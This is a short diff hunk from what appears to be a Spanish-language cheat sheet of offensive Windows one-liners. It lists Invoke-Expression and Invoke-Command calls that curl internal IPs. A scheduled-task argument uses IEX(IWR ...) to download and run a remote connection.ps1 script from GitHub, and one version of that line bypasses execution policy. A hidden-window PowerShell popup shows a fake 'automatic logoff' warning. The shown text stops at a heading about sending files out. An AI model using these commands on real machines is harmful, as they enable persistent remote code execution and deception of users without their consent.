@@ -20,7 +20,7 @@ remote code:
 	Invoke-Expression "python -c 'import os; os.system(""curl 192.168.0.4"")'"
 	Invoke-Command {python -c "import os;os.system('curl 192.168.0.3:8080')"}
 Argumento en tarea programada para windows:
-	- Argument: -executionpolicy bypass IEX(IWR https://raw.githubusercontent.com/AndresFelipeGualdron/scripts/master/connection.ps1 -UseBasicParsing);
+	- Argument: IEX("IWR https://raw.githubusercontent.com/AndresFelipeGualdron/scripts/master/connection.ps1 -UseBasicParsing");
 Mostrar alerta en windows:
 	- powershell -WindowStyle hidden -Command "& {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Automatic logoff after 1 hour of inactivity','WARNING')}"
 Enviar archivos en windows:
